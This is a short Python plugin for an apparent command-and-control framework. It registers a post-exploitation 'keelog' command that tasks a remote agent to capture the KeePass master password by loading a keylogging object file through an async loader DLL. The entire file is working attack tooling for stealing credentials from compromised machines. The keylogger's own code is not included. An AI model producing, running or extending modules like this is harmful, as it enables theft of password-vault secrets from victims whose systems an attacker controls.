import conquest
import os.path

ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
EXPORT_FUNC = "Run"
SCRIPT_DIR = os.path.dirname(__file__)

if not os.path.exists(ASYNC_DLL):
    raise FileNotFoundError(f"Async BOF DLL not found: {ASYNC_DLL}")

cmd_keelog = (
    conquest.createCommand(name="keelog", description="Capture KeePass master password (async).", example="keelog --interval 5",
                            message="Tasked agent to capture KeePass master password.", mitre=["T1056.001"])
            .addFlagInt("--interval", "interval", "Polling interval in seconds (default: 5).", False, 5)
            .setHandler(lambda agentId, cmdline, args: (
                interval := conquest.get_int(args, 0),

                bof := os.path.join(SCRIPT_DIR, "keelog.x64.o"),
                params := conquest.bof_pack("i", [
                    interval       # i: Polling interval
                ]),

                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("post-exploitation")